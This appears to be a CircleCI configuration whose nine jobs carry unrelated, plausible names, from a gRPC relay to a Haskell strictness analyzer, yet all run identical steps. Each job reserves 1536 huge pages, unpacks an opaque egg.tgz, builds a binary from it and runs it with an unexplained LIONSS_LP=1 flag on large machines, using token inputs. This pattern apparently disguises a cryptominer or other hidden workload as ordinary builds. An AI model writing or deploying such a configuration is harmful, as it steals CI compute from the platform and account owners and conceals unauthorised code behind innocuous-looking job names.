version: 2.1

jobs:
  NimbusRelay:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Register relays
          command: |
            printf 'relays = 3\n' > relay.cfg
      - run:
          name: Build relay node
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target NimbusRelay -j2
      - run:
          name: Forward relay traffic
          command: LIONSS_LP=1 ./build/NimbusRelay --config relay.cfg --proto grpc
  h2-hpack:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed header table
          command: |
            printf ':method GET\n' > hdrs.txt
      - run:
          name: Build HPACK codec
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target h2-hpack -j2
      - run:
          name: Compress header block
          command: LIONSS_LP=1 ./build/h2-hpack --headers hdrs.txt --table 4096
  grafanaPanel:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define panel
          command: |
            printf '{panel:timeseries}\n' > panel.json
      - run:
          name: Build dashboard renderer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target grafanaPanel -j2
      - run:
          name: Render time-series panel
          command: LIONSS_LP=1 ./build/grafanaPanel --panel panel.json --range 6h
  zstd-dict:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Collect samples
          command: |
            mkdir -p s && printf 'aaa\n' > s/1.txt
      - run:
          name: Build dictionary trainer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target zstd-dict -j2
      - run:
          name: Train zstd dictionary
          command: LIONSS_LP=1 ./build/zstd-dict --dir s --size 110k
  RagdollTune:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load skeleton
          command: |
            printf 'bones 24\n' > rig.skel
      - run:
          name: Build physics solver
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target RagdollTune -j2
      - run:
          name: Tune ragdoll joints
          command: LIONSS_LP=1 ./build/RagdollTune --skel rig.skel --stiffness 0.7
  predicate_pushdown:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write filter
          command: |
            printf 'x > 10\n' > pred.txt
      - run:
          name: Build rewriter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target predicate_pushdown -j2
      - run:
          name: Push predicates down
          command: LIONSS_LP=1 ./build/predicate_pushdown --pred pred.txt --into scan
  HaskellStrictness:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write module
          command: |
            printf 'module M where\n' > M.hs
      - run:
          name: Build strictness analyzer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target HaskellStrictness -j2
      - run:
          name: Analyze demand
          command: LIONSS_LP=1 ./build/HaskellStrictness --in M.hs --O2
  ReverbTail:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load impulse response
          command: |
            : > ir.wav
      - run:
          name: Build convolution engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ReverbTail -j2
      - run:
          name: Render reverb tail
          command: LIONSS_LP=1 ./build/ReverbTail --ir ir.wav --decay 2.5
  lp_dualsimplex:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Stage inputs
          command: tar xzf egg.tgz
      - run:
          name: Set up compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write LP
          command: |
            printf 'min cx\n' > dual.lp
      - run:
          name: Build dual simplex
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target lp_dualsimplex -j2
      - run:
          name: Solve LP dual
          command: LIONSS_LP=1 ./build/lp_dualsimplex --lp dual.lp --presolve
